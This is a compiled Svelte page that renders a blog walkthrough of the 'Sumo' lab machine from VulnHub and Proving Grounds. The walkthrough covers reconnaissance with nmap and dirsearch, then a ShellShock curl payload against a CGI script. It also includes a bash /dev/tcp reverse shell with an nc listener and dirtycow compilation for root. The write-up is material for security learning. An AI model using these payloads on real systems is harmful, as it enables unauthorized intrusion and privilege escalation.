import{S as cl,i as dl,s as nl,U as kt,y as fl,z as pl,A as ul,V as vl,W as Yt,g as hl,d as ml,B as _l,X as Jt,k as r,q as i,a as p,Y as C,e as Mt,l as c,m as d,r as o,h as t,c as u,Z as O,n as b,b as a,D as l,E as El}from"../chunks/index.725d15e1.js";import{P as wl}from"../chunks/post_layout.16305f07.js";function bl(L){let f,v,y,F,n,m,x,ge,Ge,we,D,q,Be,be,T,Xe,ye,Z,el=`<pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF" bash="true"><div class="language-id">bash</div><div class='code-container'><code><div class='line'><span style="color: #EEFFFF">nmap -Pn -sV -T4 192.168.1.48</span></div></code></div></pre>`,K,_,Re,V,je,Ue,z,Ze,Ke,Fe,k,Ve,W,ze,We,xe,Y,tl=`<pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF"><div class='code-container'><code><div class='line'><span style="color: undefined">python3 dirsearch --url https://192.168.1.120</span></div></code></div></pre>`,J,E,Ye,M,Je,Me,Q,Qe,et,ke,N,$,tt,Ie,S,g,lt,Pe,h,st,ee,it,ot,te,at,rt,le,ct,dt,Ae,se,ll=`<pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF"><div class='code-container'><code><div class='line'><span style="color: undefined">curl -H ‘User-Agent: () &#123; :; &#125;; whoami; pwd; pwd’ http://192.168.124.87/cgi-bin/test.sh</span></div></code></div></pre>`,ie,G,nt,Ce,oe,sl=`<pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF"><div class='code-container'><code><div class='line'><span style="color: undefined">## Listening</span></div><div class='line'><span style="color: undefined">nc -lvnp 555</span></div><div class='line'><span style="color: undefined"></span></div><div class='line'><span style="color: undefined">## Target execution</span></div><div class='line'><span style="color: undefined">curl -H ‘User-Agent: () &#123; :; &#125;; /bin/bash -i &gt;& /dev/tcp/&lt;IP&gt;/555 0&gt;&1’ http://192.168.XX.XX/cgi-bin/test.sh</span></div></code></div></pre>`,ae,I,ft,re,pt,ut,Oe,ce,il=`<pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF"><div class='code-container'><code><div class='line'><span style="color: undefined">cat ./local.txt</span></div></code></div></pre>`,de,H,B,vt,De,X,ht,Ne,ne,ol=`<pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF"><div class='code-container'><code><div class='line'><span style="color: undefined">hostnamectl  ## Game me no output</span></div><div class='line'><span style="color: undefined">uname -a</span></div></code></div></pre>`,fe,P,mt,pe,_t,Et,Se,ue,al=`<pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF"><div class='code-container'><code><div class='line'><span style="color: undefined">gcc dirtycow.c -o dcow -pthread -static</span></div></code></div></pre>`,ve,w,wt,he,bt,yt,me,Ft,xt,He,_e,rl=`<pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF"><div class='code-container'><code><div class='line'><span style="color: undefined">chmod +x ./dcow</span></div><div class='line'><span style="color: undefined">./dcow</span></div></code></div></pre>`,Ee;return{c(){f=r("h2"),v=r("a"),y=i("Introduction"),F=p(),n=r("p"),m=i("Sumo is a machine available on vulnhub and offsec proving grounds labeled "),x=r("strong"),ge=i("easy"),Ge=i(" and covers 0-day exploits discovered in the past. The machine hosts a website and has 2 flags to be submitted."),we=p(),D=r("h2"),q=r("a"),Be=i("Recon"),be=p(),T=r("p"),Xe=i("After getting the IP of the machine, ran a basic nmap scan on the target machine:"),ye=p(),Z=new C(!1),K=p(),_=r("p"),Re=i("The disovered open ports are "),V=r("code"),je=i("80"),Ue=i(" and "),z=r("code"),Ze=i("22"),Ke=i(". Lets visit the website first."),Fe=p(),k=r("p"),Ve=i("Next thing, i brute forced into the website using "),W=r("code"),ze=i("dirsearch"),We=i(":"),xe=p(),Y=new C(!1),J=p(),E=r("p"),Ye=i("I found the "),M=r("code"),Je=i("CGI-BIN"),Me=i(" endpoint. And from the nmap output, we know the version of apache is "),Q=r("code"),Qe=i("2.2.22"),et=i(" which is quite an old version."),ke=p(),N=r("h2"),$=r("a"),tt=i("Exploitation"),Ie=p(),S=r("h3"),g=r("a"),lt=i("Initial Access"),Pe=p(),h=r("p"),st=i("Now, duringthe brute force phase, i also discovered the "),ee=r("code"),it=i("test"),ot=i(" script under the "),te=r("code"),at=i("CGI-BIN"),rt=i(" folder. Since, we know the system is old, lets try the famous "),le=r("code"),ct=i("ShellShock"),dt=i(" exploit:"),Ae=p(),se=new C(!1),ie=p(),G=r("p"),nt=i("And we got the output back. Lets escalate it to a shell:"),Ce=p(),oe=new C(!1),ae=p(),I=r("p"),ft=i("And we got the shell. Our first flag is in "),re=r("code"),pt=i("local.txt"),ut=i(" file:"),Oe=p(),ce=new C(!1),de=p(),H=r("h3"),B=r("a"),vt=i("Privilege Escalation"),De=p(),X=r("p"),ht=i("Next, we need to escalate it to the root user. So, we can get the other flag as well. Lets get the system version first:"),Ne=p(),ne=new C(!1),fe=p(),P=r("p"),mt=i("Hmmm, the linux version seems to be quite old. Now, just like before, the local exploit that came quickly to mind after the shellshoch was "),pe=r("code"),_t=i("dirtycow"),Et=i(". Lets get a public version of it. Compiling it:"),Se=p(),ue=new C(!1),ve=p(),w=r("p"),wt=i("I used the "),he=r("code"),bt=i("-static"),yt=i(" flag to statically compile the glibc libraries with the binary. Otherwise, you would run into the libraries issue since the system was quite old and i was on "),me=r("code"),Ft=i("Kali 2023.1"),xt=i(". Lets execute the binary:"),He=p(),_e=new C(!1),Ee=Mt(),this.h()},l(e){f=c(e,"H2",{id:!0});var s=d(f);v=c(s,"A",{href:!0});var It=d(v);y=o(It,"Introduction"),It.forEach(t),s.forEach(t),F=u(e),n=c(e,"P",{});var Le=d(n);m=o(Le,"Sumo is a machine available on vulnhub and offsec proving grounds labeled "),x=c(Le,"STRONG",{});var Pt=d(x);ge=o(Pt,"easy"),Pt.forEach(t),Ge=o(Le," and covers 0-day exploits discovered in the past. The machine hosts a website and has 2 flags to be submitted."),Le.forEach(t),we=u(e),D=c(e,"H2",{id:!0});var At=d(D);q=c(At,"A",{href:!0});var Ct=d(q);Be=o(Ct,"Recon"),Ct.forEach(t),At.forEach(t),be=u(e),T=c(e,"P",{});var Ot=d(T);Xe=o(Ot,"After getting the IP of the machine, ran a basic nmap scan on the target machine:"),Ot.forEach(t),ye=u(e),Z=O(e,!1),K=u(e),_=c(e,"P",{});var R=d(_);Re=o(R,"The disovered open ports are "),V=c(R,"CODE",{});var Dt=d(V);je=o(Dt,"80"),Dt.forEach(t),Ue=o(R," and "),z=c(R,"CODE",{});var Nt=d(z);Ze=o(Nt,"22"),Nt.forEach(t),Ke=o(R,". Lets visit the website first."),R.forEach(t),Fe=u(e),k=c(e,"P",{});var qe=d(k);Ve=o(qe,"Next thing, i brute forced into the website using "),W=c(qe,"CODE",{});var St=d(W);ze=o(St,"dirsearch"),St.forEach(t),We=o(qe,":"),qe.forEach(t),xe=u(e),Y=O(e,!1),J=u(e),E=c(e,"P",{});var j=d(E);Ye=o(j,"I found the "),M=c(j,"CODE",{});var Ht=d(M);Je=o(Ht,"CGI-BIN"),Ht.forEach(t),Me=o(j," endpoint. And from the nmap output, we know the version of apache is "),Q=c(j,"CODE",{});var Lt=d(Q);Qe=o(Lt,"2.2.22"),Lt.forEach(t),et=o(j," which is quite an old version."),j.forEach(t),ke=u(e),N=c(e,"H2",{id:!0});var qt=d(N);$=c(qt,"A",{href:!0});var Tt=d($);tt=o(Tt,"Exploitation"),Tt.forEach(t),qt.forEach(t),Ie=u(e),S=c(e,"H3",{id:!0});var $t=d(S);g=c($t,"A",{href:!0});var gt=d(g);lt=o(gt,"Initial Access"),gt.forEach(t),$t.forEach(t),Pe=u(e),h=c(e,"P",{});var A=d(h);st=o(A,"Now, duringthe brute force phase, i also discovered the "),ee=c(A,"CODE",{});var Gt=d(ee);it=o(Gt,"test"),Gt.forEach(t),ot=o(A," script under the "),te=c(A,"CODE",{});var Bt=d(te);at=o(Bt,"CGI-BIN"),Bt.forEach(t),rt=o(A," folder. Since, we know the system is old, lets try the famous "),le=c(A,"CODE",{});var Xt=d(le);ct=o(Xt,"ShellShock"),Xt.forEach(t),dt=o(A," exploit:"),A.forEach(t),Ae=u(e),se=O(e,!1),ie=u(e),G=c(e,"P",{});var Rt=d(G);nt=o(Rt,"And we got the output back. Lets escalate it to a shell:"),Rt.forEach(t),Ce=u(e),oe=O(e,!1),ae=u(e),I=c(e,"P",{});var Te=d(I);ft=o(Te,"And we got the shell. Our first flag is in "),re=c(Te,"CODE",{});var jt=d(re);pt=o(jt,"local.txt"),jt.forEach(t),ut=o(Te," file:"),Te.forEach(t),Oe=u(e),ce=O(e,!1),de=u(e),H=c(e,"H3",{id:!0});var Ut=d(H);B=c(Ut,"A",{href:!0});var Zt=d(B);vt=o(Zt,"Privilege Escalation"),Zt.forEach(t),Ut.forEach(t),De=u(e),X=c(e,"P",{});var Kt=d(X);ht=o(Kt,"Next, we need to escalate it to the root user. So, we can get the other flag as well. Lets get the system version first:"),Kt.forEach(t),Ne=u(e),ne=O(e,!1),fe=u(e),P=c(e,"P",{});var $e=d(P);mt=o($e,"Hmmm, the linux version seems to be quite old. Now, just like before, the local exploit that came quickly to mind after the shellshoch was "),pe=c($e,"CODE",{});var Vt=d(pe);_t=o(Vt,"dirtycow"),Vt.forEach(t),Et=o($e,". Lets get a public version of it. Compiling it:"),$e.forEach(t),Se=u(e),ue=O(e,!1),ve=u(e),w=c(e,"P",{});var U=d(w);wt=o(U,"I used the "),he=c(U,"CODE",{});var zt=d(he);bt=o(zt,"-static"),zt.forEach(t),yt=o(U," flag to statically compile the glibc libraries with the binary. Otherwise, you would run into the libraries issue since the system was quite old and i was on "),me=c(U,"CODE",{});var Wt=d(me);Ft=o(Wt,"Kali 2023.1"),Wt.forEach(t),xt=o(U,". Lets execute the binary:"),U.forEach(t),He=u(e),_e=O(e,!1),Ee=Mt(),this.h()},h(){b(v,"href","#introduction"),b(f,"id","introduction"),b(q,"href","#recon"),b(D,"id","recon"),Z.a=K,Y.a=J,b($,"href","#exploitation"),b(N,"id","exploitation"),b(g,"href","#initial-access"),b(S,"id","initial-access"),se.a=ie,oe.a=ae,ce.a=de,b(B,"href","#privilege-escalation"),b(H,"id","privilege-escalation"),ne.a=fe,ue.a=ve,_e.a=Ee},m(e,s){a(e,f,s),l(f,v),l(v,y),a(e,F,s),a(e,n,s),l(n,m),l(n,x),l(x,ge),l(n,Ge),a(e,we,s),a(e,D,s),l(D,q),l(q,Be),a(e,be,s),a(e,T,s),l(T,Xe),a(e,ye,s),Z.m(el,e,s),a(e,K,s),a(e,_,s),l(_,Re),l(_,V),l(V,je),l(_,Ue),l(_,z),l(z,Ze),l(_,Ke),a(e,Fe,s),a(e,k,s),l(k,Ve),l(k,W),l(W,ze),l(k,We),a(e,xe,s),Y.m(tl,e,s),a(e,J,s),a(e,E,s),l(E,Ye),l(E,M),l(M,Je),l(E,Me),l(E,Q),l(Q,Qe),l(E,et),a(e,ke,s),a(e,N,s),l(N,$),l($,tt),a(e,Ie,s),a(e,S,s),l(S,g),l(g,lt),a(e,Pe,s),a(e,h,s),l(h,st),l(h,ee),l(ee,it),l(h,ot),l(h,te),l(te,at),l(h,rt),l(h,le),l(le,ct),l(h,dt),a(e,Ae,s),se.m(ll,e,s),a(e,ie,s),a(e,G,s),l(G,nt),a(e,Ce,s),oe.m(sl,e,s),a(e,ae,s),a(e,I,s),l(I,ft),l(I,re),l(re,pt),l(I,ut),a(e,Oe,s),ce.m(il,e,s),a(e,de,s),a(e,H,s),l(H,B),l(B,vt),a(e,De,s),a(e,X,s),l(X,ht),a(e,Ne,s),ne.m(ol,e,s),a(e,fe,s),a(e,P,s),l(P,mt),l(P,pe),l(pe,_t),l(P,Et),a(e,Se,s),ue.m(al,e,s),a(e,ve,s),a(e,w,s),l(w,wt),l(w,he),l(he,bt),l(w,yt),l(w,me),l(me,Ft),l(w,xt),a(e,He,s),_e.m(rl,e,s),a(e,Ee,s)},p:El,d(e){e&&t(f),e&&t(F),e&&t(n),e&&t(we),e&&t(D),e&&t(be),e&&t(T),e&&t(ye),e&&Z.d(),e&&t(K),e&&t(_),e&&t(Fe),e&&t(k),e&&t(xe),e&&Y.d(),e&&t(J),e&&t(E),e&&t(ke),e&&t(N),e&&t(Ie),e&&t(S),e&&t(Pe),e&&t(h),e&&t(Ae),e&&se.d(),e&&t(ie),e&&t(G),e&&t(Ce),e&&oe.d(),e&&t(ae),e&&t(I),e&&t(Oe),e&&ce.d(),e&&t(de),e&&t(H),e&&t(De),e&&t(X),e&&t(Ne),e&&ne.d(),e&&t(fe),e&&t(P),e&&t(Se),e&&ue.d(),e&&t(ve),e&&t(w),e&&t(He),e&&t(Ee),e&&_e.d()}}}function yl(L){let f,v;const y=[L[0],Qt];let F={$$slots:{default:[bl]},$$scope:{ctx:L}};for(let n=0;n<y.length;n+=1)F=kt(F,y[n]);return f=new wl({props:F}),{c(){fl(f.$$.fragment)},l(n){pl(f.$$.fragment,n)},m(n,m){ul(f,n,m),v=!0},p(n,[m]){const x=m&1?vl(y,[m&1&&Yt(n[0]),m&0&&Yt(Qt)]):{};m&2&&(x.$$scope={dirty:m,ctx:n}),f.$set(x)},i(n){v||(hl(f.$$.fragment,n),v=!0)},o(n){ml(f.$$.fragment,n),v=!1},d(n){_l(f,n)}}}const Qt={flags:[],created:"2023-07-20T04:07:53.501Z",updated:"2023-07-20T04:07:53.501Z",slug:"/blog/2023/pgrounds/sumo-easy-writeup/+page.md",path:"/blog/2023/pgrounds/sumo-easy-writeup",toc:[{depth:2,title:"Introduction",slug:"introduction"},{depth:2,title:"Recon",slug:"recon"},{depth:2,title:"Exploitation",slug:"exploitation"},{depth:3,title:"Initial Access",slug:"initial-access"},{depth:3,title:"Privilege Escalation",slug:"privilege-escalation"}]};function Fl(L,f,v){return L.$$set=y=>{v(0,f=kt(kt({},f),Jt(y)))},f=Jt(f),[f]}class Il extends cl{constructor(f){super(),dl(this,f,Fl,yl,nl,{})}}export{Il as component};
